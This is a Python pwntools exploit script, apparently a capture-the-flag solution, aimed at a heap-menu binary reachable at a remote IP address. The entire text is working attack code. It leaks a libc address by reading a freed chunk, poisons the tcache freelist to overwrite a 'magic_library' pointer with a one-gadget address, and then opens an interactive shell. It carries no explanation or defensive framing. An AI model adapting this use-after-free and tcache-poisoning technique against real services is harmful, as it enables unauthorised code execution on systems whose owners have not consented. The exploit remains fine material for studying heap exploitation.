#!/usr/bin/python3

from pwn import *
p = remote("34.155.40.100", 1235)
#p = process("./task_patched")
elf = ELF("./task_patched", checksec = 0)
libc = elf.libc

c = lambda a : p.sendlineafter(b">> ", str(a))
s = lambda a: p.send(a)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
ru = lambda a: p.recvuntil(a)
d = lambda : gdb.attach(p)

def alloc(size):
    c(1)
    sla(b"size:\n", str(size))
def edit(idx, data):
    c(2)
    sla(b"index:\n", str(idx))
    sla(b"content:\n", data)
def free(idx):
    c(3)
    sla(b"index:\n", str(idx))
def show(idx):
    c(4)
    sla(b"index:\n", str(idx))

def exploit():
    alloc(0x500) # 0
    for i in range(2):
        alloc(0x20)
    free(0)
    show(0)
    p.recvuntil(b"OUTPUT: ")
    libc.address = u64(p.recv(6).ljust(8, b"\x00")) - libc.sym.main_arena - 96
    print(hex(libc.address))
    free(1)
    free(2)
    edit(2, p64(elf.sym.magic_library))
    alloc(0x20)
    alloc(0x20)
    edit(4, p64(libc.address + 0x4f2a5))
    #d()
    p.interactive()
exploit()
